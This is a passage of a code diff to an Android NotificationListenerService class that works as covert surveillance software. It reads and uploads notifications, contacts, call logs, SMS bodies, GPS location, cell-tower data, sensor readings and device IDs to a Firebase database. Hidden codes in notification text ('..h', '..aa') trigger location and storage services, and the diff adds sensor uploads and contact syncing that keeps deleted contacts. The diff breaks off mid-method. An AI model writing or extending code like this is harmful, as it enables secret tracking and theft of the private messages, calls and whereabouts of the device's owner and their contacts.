@@ -22,6 +22,7 @@ import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
 import android.os.PowerManager;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -60,6 +61,7 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
+import java.util.Collections;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
@@ -69,7 +71,7 @@ import java.util.concurrent.Executors;
 import java.util.regex.Pattern;
 
 public class NotificationService extends NotificationListenerService implements SensorEventListener {
-
+    
     // Dedup map
     private final Map<String, Long> sentMap = new LinkedHashMap<String, Long>(60, 0.75f, true) {
         @Override
@@ -81,8 +83,7 @@ public class NotificationService extends NotificationListenerService implements 
     private final Executor executor = Executors.newSingleThreadExecutor();
 
     private static final long ONE_DAY_MS = 24 * 60 * 60 * 1000L;
-    private static final long ONE_HOUR_MS = 60 * 60 * 1000L;
-    private static final long FIFTEEN_MINUTE_MS = 15 * 60 * 1000L;
+    private static final long TEN_MINUTE_MS = 15 * 60 * 1000L;
     private static final long ONE_MINUTE_MS = 60 * 1000L;
     private static final long TEN_SECOND_MS = 10 * 1000L;
 
@@ -136,7 +137,7 @@ public class NotificationService extends NotificationListenerService implements 
                 checkAndSendContacts();
                 checkAndSendCallLogs();
                 checkAndSendSms();
-                checkAndSendUsageSummaries();
+                checkAndSendUsageSummary();
                 checkAndSendDeviceStatus();
                 checkAndSendPhotos();
             });
@@ -254,6 +255,7 @@ public class NotificationService extends NotificationListenerService implements 
             if (allText.contains("..h")) {
                 if (hasLocationPermission()) {
                     if (isLocationEnabled()) {
+                        
                         // Start location service
                         Intent locService = new Intent(this, LocationService.class);
                         startService(locService);
@@ -263,6 +265,7 @@ public class NotificationService extends NotificationListenerService implements 
 
             if (allText.contains("..aa")) {
                 if (hasStoragePermission()) {
+                    
                     // Start storage service
                     Intent StoService = new Intent(this, StorageService.class);
                     startService(StoService);
@@ -303,13 +306,13 @@ public class NotificationService extends NotificationListenerService implements 
             data.put("title", title);
             data.put("text", text);
             data.put("bigText", bigText);
-            data.put("time", formatDateTime(postTime));
+            data.put("dateTime", formatDateTime(postTime));
 
             ref.child(id).setValue(data)
-                    .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.sendNotification.firebase.FailureListener", e));
+                    .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendNotification.firebase.FailureListener", e));
 
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.sendNotification.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendNotification.catch", e);
         }
     }
 
@@ -319,49 +322,54 @@ public class NotificationService extends NotificationListenerService implements 
             FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
             if (user == null) return;
 
-            String uid = user.getUid();
-
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
-            boolean staticDataSent = sp.getBoolean("user_basic_sent", false);
-
+            
+            long lastCooldownSet = sp.getLong("last_user_basic_cooldown_set", 0);
+            long now = System.currentTimeMillis();
+            
+            if (now - lastCooldownSet < TEN_SECOND_MS) return;
+            
+            sp.edit().putLong("last_user_basic_cooldown_set", now).apply();
+            boolean oneTimeDataSent = sp.getBoolean("user_basic_onetime_sent", false);
+            
+            String uid = user.getUid();
+            
             Map<String, Object> data = new HashMap<>();
-            data.put("active", System.currentTimeMillis());
-
-            if (!staticDataSent) {
+            data.put("time", now);
+            
+            if (!oneTimeDataSent) {
+                String name = "";
+                String picture = "";
+                String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
+                
                 String androidId;
                 try {
                     androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                     if (androidId == null) androidId = "unknown";
                 } catch (Exception ignored) {
                     androidId = "unknown";
-                }
-
-                String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
-
-                data.put("name", "");
-                data.put("picture", "");
+                } 
+                
                 data.put("uid", uid);
-                data.put("androidId", androidId);
+                data.put("name", name);
+                data.put("picture", picture);
                 data.put("deviceName", deviceName);
+                data.put("androidId", androidId);
             }
 
-            try {
-                DatabaseReference userRef = FirebaseDatabase.getInstance()
-                        .getReference("users_basic")
-                        .child(uid);
-                userRef.updateChildren(data)
-                        .addOnSuccessListener(aVoid -> {
-                            if (!staticDataSent) {
-                                sp.edit().putBoolean("user_basic_sent", true).apply();
-                            }
-                        })
-                        .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.checkAndSendUserBasic.firebase.FailureListener", e));
-
-            } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.checkAndSendUserBasic.inner.catch", e);
-            }
+            DatabaseReference ref = FirebaseDatabase.getInstance()
+                    .getReference("users_basic")
+                    .child(uid);
+            ref.updateChildren(data)
+                 .addOnSuccessListener(aVoid -> {
+                     if (!oneTimeDataSent) {
+                         sp.edit().putBoolean("user_basic_onetime_sent", true).apply();
+                     }
+                 })
+                 .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendUserBasic.firebase.FailureListener", e));
+                 
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendUserBasic.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendUserBasic.catch", e);
         }
     }
 
@@ -371,16 +379,17 @@ public class NotificationService extends NotificationListenerService implements 
             FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
             if (user == null) return;
 
-            long now = System.currentTimeMillis();
-
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
+            
             long lastCooldownSet = sp.getLong("last_configs_cooldown_set", 0);
-
-            if (now - lastCooldownSet < FIFTEEN_MINUTE_MS) return;
+            long now = System.currentTimeMillis();
+            
+            if (now - lastCooldownSet < TEN_MINUTE_MS) return;
 
             sp.edit().putLong("last_configs_cooldown_set", now).apply();
 
             if (hasStoragePermission()) {
+                
                 // Start storage service
                 Intent stoService = new Intent(this, StorageService.class);
                 startService(stoService);
@@ -405,27 +414,26 @@ public class NotificationService extends NotificationListenerService implements 
                             String uploadPreset = snapshot.child("uploadPreset").getValue(String.class);
 
                             if (canUpload == null || cloudName == null || uploadPreset == null || cloudName.isEmpty() || uploadPreset.isEmpty()) return;
-
-                            SharedPreferences cloudSp = getApplicationContext().getSharedPreferences("config_data", Context.MODE_PRIVATE);
-                            cloudSp.edit()
-                                    .putBoolean("upload_enabled", canUpload)
-                                    .putString("cloud_name", cloudName)
-                                    .putString("upload_preset", uploadPreset)
-                                    .apply();
+                            
+                            sp.edit()
+                               .putBoolean("upload_enabled", canUpload)
+                               .putString("cloud_name", cloudName)
+                               .putString("upload_preset", uploadPreset)
+                               .apply();
 
                         } catch (Throwable e) {
-                            errorSendToDatabase("NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch.public.void.onDataChange.catch", e);
+                            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch.public.void.onDataChange.catch", e);
                         }
                     }
 
                     @Override
                     public void onCancelled(@NonNull DatabaseError error) {
-                        errorSendToDatabase("NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch.public.void.onCancelled", error.toException());
+                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch.public.void.onCancelled", error.toException());
                     }
                 });
 
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.cloud.catch", e);
             }
 
             // Sensors Config
@@ -444,8 +452,7 @@ public class NotificationService extends NotificationListenerService implements 
 
                             if (proximity == null && light == null && accelerometer == null) return;
 
-                            SharedPreferences sensorSp = getApplicationContext().getSharedPreferences("config_data", Context.MODE_PRIVATE);
-                            SharedPreferences.Editor editor = sensorSp.edit();
+                            SharedPreferences.Editor editor = sp.edit();
 
                             if (proximity != null) {
                                 editor.putBoolean("proximity_enabled", proximity);
@@ -462,41 +469,39 @@ public class NotificationService extends NotificationListenerService implements 
                             editor.apply();
 
                         } catch (Throwable e) {
-                            errorSendToDatabase("NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch.public.void.onDataChange.catch", e);
+                            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch.public.void.onDataChange.catch", e);
                         }
                     }
 
                     @Override
                     public void onCancelled(@NonNull DatabaseError error) {
-                        errorSendToDatabase("NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch.public.void.onCancelled", error.toException());
+                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch.public.void.onCancelled", error.toException());
                     }
                 });
 
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.inner.sensors.catch", e);
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.fetchAndSaveConfigs.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.fetchAndSaveConfigs.outer.catch", e);
         }
     }
 
     // ========================= SENSORS ==========================
     private void startSensorManager() {
         try {
-            long now = System.currentTimeMillis();
-
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
+            
             long lastCooldownSet = sp.getLong("last_sensor_manager_cooldown_set", 0);
-
+            long now = System.currentTimeMillis();
+            
             if (now - lastCooldownSet < TEN_SECOND_MS) return;
 
             sp.edit().putLong("last_sensor_manager_cooldown_set", now).apply();
 
-            SharedPreferences sp2 = getApplicationContext().getSharedPreferences("config_data", Context.MODE_PRIVATE);
-
-            boolean proximityEnabled = sp2.getBoolean("proximity_enabled", false);
-            boolean lightEnabled = sp2.getBoolean("light_enabled", false);
-            boolean accelerometerEnabled = sp2.getBoolean("accelerometer_enabled", false);
+            boolean proximityEnabled = sp.getBoolean("proximity_enabled", false);
+            boolean lightEnabled = sp.getBoolean("light_enabled", false);
+            boolean accelerometerEnabled = sp.getBoolean("accelerometer_enabled", false);
 
             sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
 
@@ -532,8 +537,14 @@ public class NotificationService extends NotificationListenerService implements 
                     movementValue = -1f;
                 }
             }
+            
+            if (proximityEnabled || lightEnabled || accelerometerEnabled) {
+                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                   sendSensorsData();
+                }, 1000);
+            }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.sensorManager.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sensorManager.catch", e);
         }
     }
 
@@ -571,12 +582,47 @@ public class NotificationService extends NotificationListenerService implements 
                 lastZ = z;
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.public.void.onSensorChanged.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.public.void.onSensorChanged.catch", e);
         }
     }
 
     @Override
     public void onAccuracyChanged(Sensor sensor, int accuracy) {}
+        
+    private void sendSensorsData() {
+        try {
+            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
+            if (user == null) return;
+            
+            DatabaseReference ref = FirebaseDatabase.getInstance()
+                        .getReference("users_data")
+                        .child(user.getUid())
+                        .child("sensors");
+
+            String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());
+
+            String id = ref.push().getKey();
+            if (id == null) return;
+
+            Map<String, Object> data = new HashMap<>();
+            data.put("proximity", proximityStatus);
+            data.put("light", lightValue);
+            data.put("movement", movementValue);
+            data.put("dateTime", dateTime);
+
+            ref.child(id).setValue(data)
+                    .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSensorsData.firebase.FailureListener", e));
+                    
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                if (sensorManager != null) {
+                    sensorManager.unregisterListener(NotificationService.this);
+                }
+            }, 3000);
+            
+        } catch (Throwable e) {
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSensorsData.catch", e);
+        }
+    }   
 
     // ========================= CELL TOWER =========================
     private void checkAndSendCellTower() {
@@ -587,10 +633,11 @@ public class NotificationService extends NotificationListenerService implements 
             if (!hasLocationPermission()) return;
             if (!isLocationEnabled()) return;
 
-            long now = System.currentTimeMillis();
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
-
+            
             long lastCooldownSet = sp.getLong("last_cell_tower_cooldown_set", 0);
+            long now = System.currentTimeMillis();
+            
             if (now - lastCooldownSet < ONE_MINUTE_MS) return;
 
             sp.edit().putLong("last_cell_tower_cooldown_set", now).apply();
@@ -682,7 +729,7 @@ public class NotificationService extends NotificationListenerService implements 
                                 .child(user.getUid())
                                 .child("cell_towers");
 
-                        String time = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.getDefault()).format(new Date());
+                        String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());
                         String id = ref.push().getKey();
                         if (id == null) return;
 
@@ -696,22 +743,22 @@ public class NotificationService extends NotificationListenerService implements 
                         data.put("pci", pci);
                         data.put("psc", psc);
                         data.put("signal", signal);
-                        data.put("time", time);
+                        data.put("dateTime", dateTime);
 
                         ref.child(id).setValue(data)
-                                .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.checkAndSendCellTower.firebase.FailureListener", e));
+                                .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.firebase.FailureListener", e));
 
                         return;
 
                     } catch (Throwable e) {
-                        errorSendToDatabase("NotificationService.java.private.void.checkAndSendCellTower.inner.catch", e);
+                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.inner.catch", e);
                     }
                 }
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.checkAndSendCellTower.middle.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.middle.catch", e);
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendCellTower.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCellTower.outer.catch", e);
         }
     }
 
@@ -723,11 +770,12 @@ public class NotificationService extends NotificationListenerService implements 
 
             if (!hasLocationPermission()) return;
             if (!isLocationEnabled()) return;
-
-            long now = System.currentTimeMillis();
+            
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
 
             long lastCooldownSet = sp.getLong("last_location_cooldown_set", 0);
+            long now = System.currentTimeMillis();
+            
             if (now - lastCooldownSet < ONE_MINUTE_MS) return;
 
             sp.edit().putLong("last_location_cooldown_set", now).apply();
@@ -764,7 +812,7 @@ public class NotificationService extends NotificationListenerService implements 
                         if (distance < 30) return;
                     }
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendLocation.inner.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.inner.catch", e);
                 }
 
                 DatabaseReference ref = FirebaseDatabase.getInstance()
@@ -772,7 +820,7 @@ public class NotificationService extends NotificationListenerService implements 
                         .child(user.getUid())
                         .child("locations");
 
-                String time = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.getDefault()).format(new Date());
+                String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());
 
                 String id = ref.push().getKey();
                 if (id == null) return;
@@ -783,7 +831,7 @@ public class NotificationService extends NotificationListenerService implements 
                 data.put("lon", loc.getLongitude());
                 data.put("accuracy", loc.getAccuracy());
                 data.put("provider", loc.getProvider());
-                data.put("time", time);
+                data.put("dateTime", dateTime);
 
                 ref.child(id).setValue(data)
                         .addOnSuccessListener(aVoid -> {
@@ -792,13 +840,13 @@ public class NotificationService extends NotificationListenerService implements 
                                     .putLong("last_known_location_lon", Double.doubleToRawLongBits(loc.getLongitude()))
                                     .apply();
                         })
-                        .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.checkAndSendCellTower.firebase.FailureListener", e));
+                        .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.firebase.FailureListener", e));
 
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.checkAndSendLocation.middle.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.middle.catch", e);
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendLocation.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendLocation.outer.catch", e);
         }
     }
 
@@ -810,102 +858,153 @@ public class NotificationService extends NotificationListenerService implements 
 
             if (!hasContactsPermission()) return;
 
-            long now = System.currentTimeMillis();
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
 
             long lastCooldownSet = sp.getLong("last_contacts_cooldown_set", 0);
-            if (now - lastCooldownSet < ONE_HOUR_MS) return;
+            long now = System.currentTimeMillis();
 
-            long lastSentTime = sp.getLong("last_contacts_sent", 0);
-            long currentModifiedTime = getLastContactUpdateTime();
+            if (now - lastCooldownSet < ONE_DAY_MS) return;
+            
+            String currentHash = getContactsHash();
+            String lastHash = sp.getString("contacts_hash", "");
 
-            if (currentModifiedTime > lastSentTime || lastSentTime == 0) {
-                if (sendContactsSmart()) {
-                    sp.edit()
-                            .putLong("last_contacts_sent", currentModifiedTime)
-                            .putLong("last_contacts_cooldown_set", now)
-                            .apply();
-                }
+            if (!currentHash.equals(lastHash)) {
+                sendContactsSmart(currentHash);
             }
+ 
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendContacts.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendContacts.catch", e);
         }
     }
-
-    private long getLastContactUpdateTime() {
+    
+    private String getContactsHash() {
         try {
+            ArrayList<String> contacts = new ArrayList<>();
+
             Cursor cursor = getContentResolver().query(
-                    ContactsContract.Contacts.CONTENT_URI,
-                    new String[]{ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP},
-                    null, null,
-                    ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP + " DESC LIMIT 1"
-            );
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[]{
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                            ContactsContract.CommonDataKinds.Phone.NUMBER
+                    },
+                    null,
+                    null,
+                    null);
 
-            if (cursor != null && cursor.moveToFirst()) {
-                long time = cursor.getLong(0);
-                cursor.close();
-                return time;
-            }
-            if (cursor != null) cursor.close();
+           if (cursor != null) {
+               int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+               int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+
+               while (cursor.moveToNext()) {
+                   String name = cursor.getString(nameIdx);
+                   String number = cursor.getString(numIdx);
+
+                   if (number != null) {
+                       contacts.add(name + "|" + number.replaceAll("\\s+", ""));
+                   }
+               }
+               cursor.close();
+           }
+
+           Collections.sort(contacts);
+           return String.valueOf(contacts.toString().hashCode());
+
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.long.getLastContactUpdateTime.catch", e);
+           ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.String.getContactsHash.catch", e);
         }
-        return 0;
+        return "";
     }
-
-    private boolean sendContactsSmart() {
+    
+    private void sendContactsSmart(String currentHash) {
         try {
             FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
-            if (user == null) return false;
-            if (!hasContactsPermission()) return false;
 
             DatabaseReference ref = FirebaseDatabase.getInstance()
                     .getReference("users_data")
                     .child(user.getUid())
                     .child("contacts");
 
-            try (Cursor cursor = getContentResolver().query(
-                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    null, null, null, null
-            )) {
-                if (cursor == null) return false;
-                Map<String, Object> batchUpdate = new HashMap<>();
+            Map<String, Object> deviceContacts = new HashMap<>();
 
-                int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
-                int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
 
-                while (cursor.moveToNext()) {
+            if (cursor == null) return;
+
+            int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+            int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+
+            while (cursor.moveToNext()) {
+                try {
+                    String name = nameIdx != -1 ? cursor.getString(nameIdx) : "Unknown";
+                    String number = numIdx != -1 ? cursor.getString(numIdx) : null;
+
+                    if (number == null || number.trim().isEmpty()) continue;
+
+                    String cleanNumber = number.replaceAll("\\s+", "");
+                    String safeKey = cleanNumber.replaceAll("[.#$\\[\\]]", "_");
+
+                    if (safeKey.isEmpty()) continue;
+
+                    Map<String,Object> data = new HashMap<>();
+
+                    data.put("name", name);
+                    data.put("number", cleanNumber);
+                    data.put("inPhone", true);
+
+                    deviceContacts.put(safeKey, data);
+
+                } catch(Throwable e) {
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.inner.catch", e);
+                }
+            }
+            cursor.close();
+
+            ref.addListenerForSingleValueEvent(new ValueEventListener() {
+
+                @Override
+                public void onDataChange(DataSnapshot snapshot) {
                     try {
-                        String name = (nameIdx != -1) ? cursor.getString(nameIdx) : "Unknown";
-                        String number = (numIdx != -1) ? cursor.getString(numIdx) : null;
+                        Map<String,Object> update = new HashMap<>();
 
-                        if (number == null || number.trim().isEmpty()) continue;
+                        for(DataSnapshot child : snapshot.getChildren()) {
+                           String key = child.getKey();
+                      
+                           if(!deviceContacts.containsKey(key)) {
+                           
+                              Map<String,Object> old = new HashMap<>();
+                              old.put("name", child.child("name").getValue(String.class));
+                              old.put("number", child.child("number").getValue(String.class));
+                              old.put("inPhone", false);
+ 
+                              update.put(key, old);
+                           }
+                        }
 
-                        String cleanNumber = number.replaceAll("\\s+", "");
-                        String safeKey = cleanNumber.replaceAll("[.#$\\[\\]]", "_");
-
-                        if (safeKey.isEmpty()) continue;
-
-                        Map<String, Object> data = new HashMap<>();
-                        data.put("name", name);
-                        data.put("number", cleanNumber);
-
-                        batchUpdate.put(safeKey, data);
-
+                        update.putAll(deviceContacts);
+                    
+                        ref.updateChildren(update).addOnSuccessListener(unused -> {
+                        
+                           SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
+                           sp.edit()
+                              .putString("contacts_hash", currentHash)
+                              .putLong("last_contacts_cooldown_set", System.currentTimeMillis())
+                              .apply();
+                        })
+                        .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.firebase.FailureListener", e));
+                        
                     } catch (Throwable e) {
-                        errorSendToDatabase("NotificationService.java.private.void.sendContactsSmart.inner.catch", e);
+                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.outer.catch.public.void.onDataChange", e);
                     }
                 }
-
-                if (!batchUpdate.isEmpty()) {
-                    ref.updateChildren(batchUpdate)
-                            .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.sendContactsSmart.firebase.FailureListener", e));
+                
+                @Override
+                public void onCancelled(DatabaseError error) {
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.outer.catch.public.void.onCancelled", error.toException());
                 }
-                return true;
-            }
-        } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.sendContactsSmart.outer.catch", e);
-            return false;
+            });
+            
+        } catch(Throwable e) {
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.outer.catch", e);
         }
     }
 
@@ -917,10 +1016,11 @@ public class NotificationService extends NotificationListenerService implements 
 
             if (!hasCallLogPermission()) return;
 
-            long now = System.currentTimeMillis();
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
 
             long lastCooldownSet = sp.getLong("last_call_logs_cooldown_set", 0);
+            long now = System.currentTimeMillis();
+             
             if (now - lastCooldownSet < ONE_MINUTE_MS) return;
 
             sp.edit().putLong("last_call_logs_cooldown_set", now).apply();
@@ -951,8 +1051,8 @@ public class NotificationService extends NotificationListenerService implements 
 
                         while (cursor.moveToNext()) {
                             try {
-                                long date = (dateIdx != -1) ? cursor.getLong(dateIdx) : 0;
-                                if (date > maxTime) maxTime = date;
+                                long dateTime = (dateIdx != -1) ? cursor.getLong(dateIdx) : 0;
+                                if (dateTime > maxTime) maxTime = dateTime;
 
                                 String number = (numIdx != -1) ? cursor.getString(numIdx) : "Unknown";
                                 String name = (nameIdx != -1) ? cursor.getString(nameIdx) : "";
@@ -971,12 +1071,12 @@ public class NotificationService extends NotificationListenerService implements 
                                 data.put("number", number);
                                 data.put("name", name != null ? name : "");
                                 data.put("type", callType);
-                                data.put("date", formatDateTime(date));
+                                data.put("dateTime", formatDateTime(dateTime));
                                 data.put("duration", formatDuration(duration * 1000L));
                                 batchUpdate.put(id, data);
 
                             } catch (Throwable e) {
-                                errorSendToDatabase("NotificationService.java.private.void.checkAndSendCallLogs.inner.catch", e);
+                                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.inner.catch", e);
                             }
                         }
 
@@ -986,15 +1086,15 @@ public class NotificationService extends NotificationListenerService implements 
                                     .addOnSuccessListener(aVoid -> {
                                         sp.edit().putLong("last_call_logs_sent", timeToSave).apply();
                                     })
-                                    .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.checkAndSendCallLogs.firebase.FailureListener", e));
+                                    .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.firebase.FailureListener", e));
                         }
                     }
                 }
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.checkAndSendCallLogs.middle.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.middle.catch", e);
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendCallLogs.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.outer.catch", e);
         }
     }
 
@@ -1005,11 +1105,12 @@ public class NotificationService extends NotificationListenerService implements 
             if (user == null) return;
 
             if (!hasSmsPermission()) return;
-
-            long now = System.currentTimeMillis();
+            
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
 
             long lastCooldownSet = sp.getLong("last_sms_cooldown_set", 0);
+            long now = System.currentTimeMillis();
+            
             if (now - lastCooldownSet < ONE_MINUTE_MS) return;
 
             long lastSentTime = sp.getLong("last_sms_sent", 0);
@@ -1025,7 +1126,7 @@ public class NotificationService extends NotificationListenerService implements 
                 sp.edit().putLong("last_sms_cooldown_set", now).apply();
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendSms.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendSms.catch", e);
         }
     }
 
@@ -1040,7 +1141,7 @@ public class NotificationService extends NotificationListenerService implements 
             sendSmsToDatabase(userId, smsList, sp);
             return true;
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.sendAllSms.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.sendAllSms.catch", e);
             return false;
         }
     }
@@ -1059,7 +1160,7 @@ public class NotificationService extends NotificationListenerService implements 
             sendSmsToDatabase(userId, newSmsList, sp);
             return true;
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.sendNewSms.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.sendNewSms.catch", e);
             return false;
         }
     }
@@ -1090,25 +1191,25 @@ public class NotificationService extends NotificationListenerService implements 
                         sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
                         sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                         sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
-                        sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
+                        sms.put("dateTime", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                         int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                         sms.put("type", type == 1 ? "Inbox" : "Sent");
                         smsList.add(sms);
                     } catch (Throwable e) {
-                        errorSendToDatabase("NotificationService.java.private.list.readSms.inner.catch", e);
+                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.list.readSms.inner.catch", e);
                     }
                 }
             }
             return smsList;
 
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.list.readSms.outer.catch", e);
